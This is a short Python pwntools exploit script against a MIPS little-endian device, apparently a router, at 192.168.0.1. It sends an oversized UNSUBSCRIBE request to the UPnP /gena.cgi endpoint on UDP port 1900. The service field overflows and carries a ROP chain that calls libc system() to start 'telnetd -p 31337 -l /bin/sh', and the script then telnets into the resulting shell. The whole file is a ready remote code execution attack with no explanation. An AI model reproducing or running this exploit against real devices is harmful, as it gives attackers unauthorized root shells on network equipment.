#!/usr/bin/python3
from pwn import *
from os import *

context.arch = 'mips'
context.endian = 'little'
con = remote('192.168.0.1', 1900, typ='udp')

#0x169c0 : lw $a1, 0x19c($fp) ; addiu $s2, $sp, 0x18 ; move $a2, $v1 ; move $t9, $s0 ; jalr $t9 ; move $a0, $s2
#0x32a98 : addiu $s0, $s0, 1 ; addiu $s2, $zero, 1 ; move $t9, $s1 ; jalr $t9 ; move $a0, $s3

libc = 0x2aaf8000

s0 = libc + 0x53200 - 1 # system - 1
s1 = libc + 0x169c4  # set a0 to our cmd's, jump to $s0
s2 = 0xdeadbeef
ra = libc + 0x32a98 # set s0 += 1 (system), jump to $s1 

payload = b"UNSUBSCRIBE /gena.cgi?service="
payload += b'a'*0x1ce + p32(s0) + p32(s1) + p32(s2) + p32(ra) + b'v'*0x18 + b'telnetd -p 31337 -l /bin/sh;'
payload += b" HTTP/1.1\r\n"
payload += b"Host: 192.168.0.1:1900\r\n"
payload += b"SID: 1\r\n\r\n" 

con.send(payload)
sleep(1)
system('telnet 192.168.0.1 31337')